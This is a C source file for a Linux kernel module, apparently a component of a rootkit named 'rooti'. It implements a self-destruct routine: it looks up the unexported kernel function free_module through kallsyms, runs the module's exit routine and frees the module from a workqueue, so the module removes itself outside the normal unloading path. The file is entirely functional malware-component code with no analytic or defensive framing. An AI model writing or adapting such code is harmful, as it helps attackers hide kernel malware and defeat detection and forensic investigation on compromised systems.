#include <linux/workqueue.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/mutex.h>
#include "unloading.h"
#include "../utils.h"

static struct module *mod = NULL;

static void rooti_self_unload(struct work_struct *work)
{
    void (*__free_module)(struct module *mod) = (void (*)(struct module *))__kallsyms_lookup_name("free_module");
    if (__free_module == NULL) {
        ROOTI_DEBUG("unresolved symbol: '__free_module'");
        return;
    }
    mod->exit();
    __free_module(mod);
}

DECLARE_WORK(rooti_self_unload_work, rooti_self_unload);

void rooti_self_destruct()
{
    queue_work(system_long_wq, &rooti_self_unload_work);
    mod = THIS_MODULE;
}